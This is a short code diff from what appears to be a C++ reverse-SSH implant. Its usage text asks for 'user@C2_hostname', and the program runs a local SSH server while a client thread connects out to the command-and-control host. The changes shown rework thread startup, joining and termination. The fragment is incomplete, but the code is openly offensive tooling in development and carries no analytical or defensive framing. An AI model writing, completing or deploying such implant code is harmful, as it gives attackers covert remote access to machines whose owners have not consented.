@@ -32,13 +32,6 @@ Restart sshd:
 systemctl restart ssh
 */
 
-#ifndef _WIN32
-#include <unistd.h>
-void Sleep(int milliseconds) {
-    sleep(milliseconds/1000);
-}
-#endif
-
 void help(char* self) {
     debug("Usage: %s [user@C2_hostname [LOCAL_SSH_SERVER_PORT]\n", self);
     debug("Example: %s user@C2_hostname\n", self);
@@ -96,20 +89,15 @@ int main(int argc, char** argv){
     auto server = SSHServer();
     std::thread server_thread(server.run, ssh_server_port_int);
 
+    Sleep(1000);
+
     // Client
     auto client = SSHClient();
     std::thread client_thread(client.run, username, C2_host, ssh_server_port_int);
 
-    server_thread.detach();
-    Sleep(1000);
-    client_thread.detach();
-
-    while (true)
-    {
-        Sleep(99999);
-    }
-
     server_thread.join();
+
+    client.should_terminate = 1;
     client_thread.join();
 
 	ssh_finalize();
